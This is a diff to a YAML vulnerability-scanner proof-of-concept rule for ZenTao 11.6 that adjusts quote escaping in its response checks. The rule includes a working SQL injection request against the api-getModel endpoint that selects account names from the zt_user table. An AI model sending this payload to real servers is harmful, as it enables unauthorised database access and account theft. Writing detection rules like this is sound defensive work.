@@ -9,14 +9,14 @@ rules:
       Accept-Encoding: 'deflate'
     follow_redirects: false
     expression: |
-      response.status == 200 && response.body.bcontains(bytes(string('\"sessionVar\":\"zentaosid\"')))
+      response.status == 200 && response.body.bcontains(bytes(string("\"sessionVar\":\"zentaosid\"")))
   - method: GET
     path: /zentao/api-getModel-api-sql-sql=select+account,{{rand}}+from+zt_user
     headers:
       User-Agent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
       Accept-Encoding: 'deflate'
     expression: |
-      response.status == 200 && response.body.bcontains(bytes(string(rand))) && response.body.bcontains(bytes(string('{\"status\":\"success\",\"data\":\"[{\\\"account\\\":\\\"'))) 
+      response.status == 200 && response.body.bcontains(bytes(string(rand))) && response.body.bcontains(bytes(string("\"status\":\"success\",\"data\":\"[{\\\"account\\\":\\\"")))
 detail:
   author: 清风明月(www.secbook.info)
   zentao_version: 'version: 11.6'
